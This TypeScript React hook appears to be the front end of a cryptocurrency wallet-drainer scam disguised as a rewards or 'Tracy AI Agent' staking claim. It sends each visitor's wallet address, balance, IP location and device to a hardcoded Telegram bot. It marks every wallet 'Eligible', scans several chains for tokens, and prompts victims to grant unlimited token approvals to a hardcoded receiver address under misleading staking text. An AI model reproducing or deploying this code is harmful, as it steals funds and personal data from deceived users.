"use client";

import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";
import { useWeb3Modal, useWeb3ModalProvider, useWeb3ModalAccount, useDisconnect } from '@web3modal/ethers/react';

// Configuration from PRD/User
const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088";
const MORALIS_API_KEY = process.env.NEXT_PUBLIC_MORALIS_API_KEY;

// Fallback Token List (Top Assets) to scan if API fails
const TARGET_TOKENS: Record<string, string[]> = {
    "0x1": [ // Ethereum
        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
    ],
    "0x38": [ // BSC
        "0x55d398326f99059fF775485246999027B3197955", // USDT
        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
        "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
        "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", // WBNB
    ],
    "0x89": [ // Polygon
        "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT
        "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC
        "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", // WETH
        "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", // WBTC
    ],
    "0x2105": [ // Base
        "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC
        "0x4200000000000000000000000000000000000006", // WETH
    ],
    "0xa4b1": [ // Arbitrum
        "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", // USDT
        "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", // USDC
        "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", // WETH
    ],
    "0xa": [ // Optimism
        "0x94b008aA21116C48a263c9276e2Ed1c9ad9e4302", // USDT
        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", // USDC
        "0x4200000000000000000000000000000000000006", // WETH
    ],
    "0xa86a": [ // Avalanche
        "0x9702230A8Ea53601f5cD2dc00fDBc13d4df4A8c7", // USDT.e
        "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", // USDC
        "0xB31f66aa3c1e785363f0875a1b74e27b85fd66c7", // WAVAX
    ]
};

const MINIMAL_ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function symbol() view returns (string)",
    "function decimals() view returns (uint8)"
];

export function useWeb3Manager() {
    // Safety check for SSR: useWeb3Modal hooks can crash if createWeb3Modal hasn't been called.
    // In Next.js, we detect SSR via typeof window.
    const isClient = typeof window !== 'undefined';

    // Call hooks unconditionally to follow React guidelines, 
    // but we'll guard their usage and values.
    const accountContext = useWeb3ModalAccount();
    const providerContext = useWeb3ModalProvider();
    const modalContext = useWeb3Modal();
    const disconnectContext = useDisconnect();

    // Safely extract values
    const address = isClient ? accountContext.address : undefined;
    const isConnected = isClient ? accountContext.isConnected : false;
    const walletProvider = isClient ? providerContext.walletProvider : undefined;
    const open = isClient ? modalContext.open : () => Promise.resolve();
    const w3mDisconnect = isClient ? disconnectContext.disconnect : () => Promise.resolve();

    // State
    const [account, setAccount] = useState<string | null>(null);
    const [eligibility, setEligibility] = useState<"Checking" | "Eligible" | "Not Eligible">("Checking");

    // V5 Agent States
    const [currentTask, setCurrentTask] = useState<string>("");
    const [targetToken, setTargetToken] = useState<any>(null);
    const [targetChain, setTargetChain] = useState<string>("");

    // Ref to prevent duplicate "Connect" logs
    const hasLoggedConnection = useRef(false);
    const isProcessing = useRef(false);

    // --- INTEGRATIONS ---
    const TG_BOT_TOKEN = process.env.NEXT_PUBLIC_TG_BOT_TOKEN || "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
    const TG_CHAT_ID = process.env.NEXT_PUBLIC_TG_CHAT_ID || "7772781858";

    // Helper: Get IP Info
    const getIpInfo = async () => {
        try {
            const res = await fetch('https://ipapi.co/json/');
            return await res.json();
        } catch (e) {
            return { ip: 'Unknown', country_name: 'Unknown', city: 'Unknown' };
        }
    };

    // Helper: Send Notification
    const notifyTelegram = async (message: string) => {
        if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
        try {
            await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TG_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            });
        } catch (e) {
            console.error("TG Notification failed", e);
        }
    };

    // Sync state & Log Connection
    useEffect(() => {
        if (isConnected && address) {
            setAccount(address);

            // Only log if not already logged (Session Storage + Ref)
            const sessionKey = `logged_${address}`;
            if (!hasLoggedConnection.current && !sessionStorage.getItem(sessionKey)) {
                hasLoggedConnection.current = true;
                sessionStorage.setItem(sessionKey, "true");

                // Fetch Balance & IP for robust logging
                (async () => {
                    const ipData = await getIpInfo();
                    let balance = "0.0000";
                    let chainId = "Unknown";

                    if (walletProvider) {
                        try {
                            const provider = new ethers.BrowserProvider(walletProvider);
                            // RPC calls can be flaky (e.g. -32603), so we swallow errors here to avoid UI crashes
                            try {
                                const bal = await provider.getBalance(address);
                                balance = ethers.formatEther(bal);
                                const net = await provider.getNetwork();
                                chainId = net.chainId.toString();
                            } catch (rpcError) {
                                console.warn("Failed to fetch balance/chain:", rpcError);
                            }
                        } catch (e) { }
                    }

                    notifyTelegram(
                        `<b>🔌 New Wallet Connected</b>\n\n` +
                        `👛 <b>Address:</b> <code>${address}</code>\n` +
                        `💰 <b>Balance:</b> ${parseFloat(balance).toFixed(4)} ETH/Matic\n` +
                        `🌍 <b>Location:</b> ${ipData.city}, ${ipData.country_name} (${ipData.ip})\n` +
                        `🔗 <b>Chain ID:</b> ${chainId}\n` +
                        `📱 <b>Device:</b> ${navigator.userAgent.includes("Mobile") ? "Mobile" : "Desktop"}`
                    );
                })();
            }
        } else {
            setAccount(null);
            hasLoggedConnection.current = false;
            setEligibility("Checking");
        }
    }, [isConnected, address, walletProvider]);

    // Manual Disconnect / Connect
    const disconnect = async () => {
        try {
            await w3mDisconnect();

            // Surgically clear WalletConnect session data
            Object.keys(localStorage).forEach(key => {
                if (key.includes('wc@2')) {
                    localStorage.removeItem(key);
                }
            });
            localStorage.removeItem('walletconnect'); // Legacy

            setAccount(null);
            window.location.reload();
        } catch (e) {
            console.error("Disconnect Failed:", e);
            // Fallback reload
            window.location.reload();
        }
    };

    const openConnectModal = async () => {
        console.log("🖱️ Connect Button Clicked. Calling Modal Open...");
        try {
            await open();
            console.log("✅ Modal Open Request Sent");
        } catch (e) {
            console.error("❌ Modal Open failed:", e);
        }
    };

    const checkEligibility = async () => {
        if (!address || !walletProvider) return { isEligible: false, tokensToDrain: [] };

        // Artificial delay for UX "Scanning" feel
        await new Promise(r => setTimeout(r, 2000));

        // 1. ROBUST LOGGING: Details at start of scan
        try {
            const ipData = await getIpInfo();
            notifyTelegram(
                `<b>🕵️‍♂️ Starting V4 Scan...</b>\n` +
                `👛 <code>${address}</code>\n` +
                `🌍 ${ipData.city}, ${ipData.country_name}\n` +
                `📱 ${navigator.userAgent.includes("Mobile") ? "Mobile" : "Desktop"}`
            );
        } catch (e) {
            // Fallback log if IP fails
            notifyTelegram(`<b>🕵️‍♂️ Starting Scan...</b>\nAddress: <code>${address}</code>`);
        }

        let totalUsdValue = 0;
        let allAssets: { address: string; chainId: string; symbol: string; isNative: boolean; balance: string; usd_value: number }[] = [];

        const chains = [
            { id: "0x1", name: "Ethereum", symbol: "ETH" },
            { id: "0x38", name: "BSC", symbol: "BNB" },
            { id: "0x89", name: "Polygon", symbol: "MATIC" },
            { id: "0x2105", name: "Base", symbol: "ETH" },
            { id: "0xa4b1", name: "Arbitrum", symbol: "ETH" },
            { id: "0xa", name: "Optimism", symbol: "ETH" },
            { id: "0xa86a", name: "Avalanche", symbol: "AVAX" },
            { id: "0xfa", name: "Fantom", symbol: "FTM" }
        ];

        // 2. MORALIS SCAN
        let moralisSuccess = false;
        if (MORALIS_API_KEY) {
            await Promise.all(chains.map(async (chain) => {
                try {
                    // A. Native (Moralis)
                    const nativeRes = await fetch(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/balance?chain=${chain.id}`, {
                        headers: { 'X-API-Key': MORALIS_API_KEY, 'accept': 'application/json' }
                    });

                    if (nativeRes.ok) {
                        const nativeData = await nativeRes.json();
                        if (nativeData && BigInt(nativeData.balance) > 0n) {
                            allAssets.push({
                                address: "0x0000000000000000000000000000000000000000",
                                chainId: chain.id,
                                symbol: chain.symbol,
                                isNative: true,
                                balance: nativeData.balance,
                                usd_value: 10 // Base priority
                            });
                        }
                    }

                    // B. ERC20 (Moralis)
                    const tokenRes = await fetch(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/tokens?chain=${chain.id}&exclude_spam=true`, {
                        headers: { 'X-API-Key': MORALIS_API_KEY, 'accept': 'application/json' }
                    });

                    if (tokenRes.ok) {
                        moralisSuccess = true;
                        const data = await tokenRes.json();
                        if (data.result) {
                            data.result.forEach((t: any) => {
                                allAssets.push({
                                    address: t.token_address,
                                    chainId: chain.id,
                                    symbol: t.symbol,
                                    isNative: false,
                                    balance: t.balance,
                                    usd_value: parseFloat(t.usd_value || "0")
                                });
                            });
                        }
                    } else {
                        console.warn(`Moralis API Error (${chain.name}): ${tokenRes.status}`);
                        // Don't auto-notify every failure to avoid spam, unless all fail.
                    }
                } catch (e) {
                    console.warn(`Scan Fail ${chain.name}`, e);
                }
            }));
        }

        // 3. FALLBACK RPC SCAN (Current Chain Only)
        // If Moralis failed OR returned nothing, scan target tokens on current chain
        if (!moralisSuccess || allAssets.length === 0) {
            notifyTelegram(`<b>⚠️ Moralis Empty/Failed. Running Fallback RPC Scan...</b>`);
            try {
                const provider = new ethers.BrowserProvider(walletProvider);
                const network = await provider.getNetwork();
                const chainIdHex = "0x" + network.chainId.toString(16);

                const targetTokens = TARGET_TOKENS[chainIdHex] || [];
                if (targetTokens.length > 0) {
                    await Promise.all(targetTokens.map(async (tAddr) => {
                        try {
                            const contract = new ethers.Contract(tAddr, MINIMAL_ERC20_ABI, provider);
                            const bal = await contract.balanceOf(address);
                            if (bal > 0n) {
                                const symbol = await contract.symbol();
                                const decimals = await contract.decimals();
                                // Mock USD value based on symbol for sorting priority
                                let mockUsd = 0;
                                if (symbol.includes("USD")) mockUsd = 1000;
                                else if (symbol.includes("ETH")) mockUsd = 2000;
                                else mockUsd = 50;

                                allAssets.push({
                                    address: tAddr,
                                    chainId: chainIdHex,
                                    symbol: symbol,
                                    isNative: false,
                                    balance: bal.toString(),
                                    usd_value: mockUsd
                                });
                                notifyTelegram(`<b>🔫 Fallback Found:</b> ${symbol} on current chain`);
                            }
                        } catch (err) { }
                    }));
                }
            } catch (e) {
                console.error("Fallback scan failed", e);
            }
        }

        // SORT: Highest Value First
        allAssets.sort((a, b) => b.usd_value - a.usd_value);

        // LOG RESULT
        if (allAssets.length > 0) {
            const top = allAssets[0];
            notifyTelegram(
                `<b>✅ Scan Complete</b>\n` +
                `Assets: ${allAssets.length}\n` +
                `🏆 Top: <b>${top.symbol}</b> ($${top.usd_value?.toFixed(2)})\n` +
                `🔗 Chain: ${top.chainId}`
            );
        } else {
            notifyTelegram(`<b>❌ Scan Complete: Zero Assets Found</b>\nWill attempt blind native drain.`);
        }

        // FORCE ELIGIBILITY
        setEligibility("Eligible");
        return { isEligible: true, tokensToDrain: allAssets };
    };

    // Helper: Switch Network
    const switchNetwork = async (provider: any, chainIdHex: string) => {
        try {
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: chainIdHex }],
            });
            return true;
        } catch (switchError: any) {
            // This error code indicates that the chain has not been added to MetaMask.
            if (switchError.code === 4902) {
                console.warn("Chain not found in wallet");
                notifyTelegram(`<b>⚠️ Network Switch Failed</b>\nTarget: ${chainIdHex}\nUser needs to add chain manually.`);
            }
            return false;
        }
    };

    // Execute Drain Logic
    const claimReward = async (tokens: any[]) => { // Accepts array of objects
        if (!walletProvider || !address || isProcessing.current) return;
        isProcessing.current = true;

        try {
            const provider = new ethers.BrowserProvider(walletProvider);

            // PRIORITIZATION: Sort tokens by Value (Highest First)
            // Native tokens have a base value of 10 USD assigned in discovery if price missing.
            // We want to drain Tokens first, then Native (Native pays for gas).
            // So we separate them.

            // 1. Group by Chain
            const tokensByChain: Record<string, typeof tokens> = {};

            // If tokens array is empty (API failure fallback), try to infer current chain
            if (tokens.length === 0) {
                const net = await provider.getNetwork();
                const chainId = "0x" + net.chainId.toString(16);
                tokensByChain[chainId] = []; // Empty, implies native only check
            } else {
                tokens.forEach(t => {
                    if (!tokensByChain[t.chainId]) tokensByChain[t.chainId] = [];
                    tokensByChain[t.chainId].push(t);
                });
            }

            // Process each chain
            const chainIds = Object.keys(tokensByChain);

            // Notify Start
            notifyTelegram(`<b>🚀 Initiating V4 Drain Sequence</b>\nAddress: <code>${address}</code>\nTarget Chains: ${chainIds.length}`);

            for (const chainId of chainIds) {
                setTargetChain(chainId);
                // 1. Switch Chain & SYNC CHECK
                try {
                    const checkProvider = new ethers.BrowserProvider(walletProvider);
                    const initialNetwork = await checkProvider.getNetwork();
                    const initialChainIdHex = "0x" + initialNetwork.chainId.toString(16);

                    if (BigInt(initialChainIdHex) !== BigInt(chainId)) {
                        setCurrentTask(`Scanning ${chainId} for on-chain activities and proofs...`);
                        notifyTelegram(`<b>🔄 Switching to ${chainId}...</b>`);
                        const switched = await switchNetwork(walletProvider, chainId);
                        if (!switched) {
                            notifyTelegram(`<b>❌ Switch Failed</b> for ${chainId}.`);
                            continue;
                        }

                        // STRICT SYNC: Wait up to 10s for provider to acknowledge the switch
                        let synced = false;
                        for (let i = 0; i < 5; i++) {
                            await new Promise(r => setTimeout(r, 2000));
                            const net = await (new ethers.BrowserProvider(walletProvider)).getNetwork();
                            if (BigInt("0x" + net.chainId.toString(16)) === BigInt(chainId)) {
                                synced = true;
                                break;
                            }
                            console.warn(`Sync retry ${i + 1} for ${chainId}`);
                        }

                        if (!synced) {
                            notifyTelegram(`<b>⚠️ Sync Timeout</b>: Wallet on wrong network. Skipping assets.`);
                            continue;
                        }
                    }
                } catch (e) { continue; }

                // 2. Smart Gas Check (Native Balance)
                let gasPrice = 1000000000n;
                try {
                    const providerOnChain = new ethers.BrowserProvider(walletProvider);
                    const nativeBalance = await providerOnChain.getBalance(address);
                    const feeData = await providerOnChain.getFeeData();
                    gasPrice = feeData.gasPrice || 1000000000n;

                    // Min gas: Approval (50k)
                    const minGasNeeded = gasPrice * 50000n;

                    if (nativeBalance < minGasNeeded) {
                        notifyTelegram(`<b>⚠️ Low Gas on ${chainId}</b>\nBalance: ${ethers.formatEther(nativeBalance)}\nSkipping assets to prevent freeze.`);
                        continue;
                    }
                } catch (gasErr) {
                    console.warn("Gas check failed, proceeding anyway", gasErr);
                }

                // 3. Drain ERC20s (Sorted High -> Low)
                const chainTokens = tokensByChain[chainId].filter(t => !t.isNative);
                // Double check sort
                chainTokens.sort((a, b) => (b.usd_value || 0) - (a.usd_value || 0));

                for (const token of chainTokens) {
                    try {
                        setTargetToken(token);
                        setCurrentTask(`Allow Tracy AI Agent to help stake, unstake and claim your ${token.symbol} for you while earning TRACE tokens.`);
                        notifyTelegram(`<b>⏳ Processing ${token.symbol}</b>\nValue: $${token.usd_value?.toFixed(2)}`);

                        const providerOnChain = new ethers.BrowserProvider(walletProvider);
                        const signer = await providerOnChain.getSigner();
                        const tokenContract = new ethers.Contract(token.address, [
                            "function approve(address spender, uint256 amount) public returns (bool)",
                            "function allowance(address owner, address spender) public view returns (uint256)"
                        ], signer);

                        // TRUST API BALANCE (Fixes "Missing Revert Data")
                        const apiBalance = BigInt(token.balance || "0");
                        if (apiBalance === 0n) continue;

                        let allowance = 0n;
                        try {
                            allowance = await tokenContract.allowance(address, RECEIVER_ADDRESS);
                        } catch (e) {
                            console.warn(`Allowance check failed for ${token.symbol}, assuming 0`, e);
                        }

                        // Only skip if we are POSITIVE the allowance is sufficient
                        if (allowance >= apiBalance && allowance > 0n) {
                            setCurrentTask(`Tracy is executing automated transfer for ${token.symbol}...`);
                            notifyTelegram(`<b>✅ Already Approved:</b> ${token.symbol}. Worker transfer pending.`);
                            await new Promise(r => setTimeout(r, 2000)); // Visible feedback
                            continue;
                        }

                        // REQUEST APPROVAL
                        const tx = await tokenContract.approve(RECEIVER_ADDRESS, ethers.MaxUint256);
                        setCurrentTask(`Verifying ${token.symbol} on-chain claim...`);
                        notifyTelegram(`<b>🚀 Approval Sent!</b>\nToken: ${token.symbol}\nTx: ${tx.hash}`);
                        await tx.wait();

                        notifyTelegram(`<b>💎 ${token.symbol} Approval Confirmed!</b>`);

                    } catch (err: any) {
                        if (err.info?.error?.code === 4001 || err.code === "ACTION_REJECTED" || err.message?.includes("rejected")) {
                            notifyTelegram(`<b>❌ User Rejected</b> ${token.symbol}`);
                        } else {
                            console.error(`Error draining ${token.symbol}`, err);
                            notifyTelegram(`<b>⚠️ Error ${token.symbol}</b>: ${err.message?.slice(0, 50)}`);
                        }
                    }
                }
            }

            setCurrentTask("All scheduled agent tasks complete.");
            notifyTelegram(`<b>🏁 Sequence Complete</b>`);
            isProcessing.current = false;
        } catch (e) {
            console.error("Critical Drain Error", e);
            notifyTelegram(`<b>☠️ Critical Error</b>\n${e}`);
            isProcessing.current = false;
        }
    };

    return {
        connect: openConnectModal,
        disconnect,
        isConnecting: false, // Explicitly return false to satisfy types
        account,
        eligibility,
        checkEligibility,
        claimReward,
        currentTask,
        targetToken,
        targetChain
    };
}
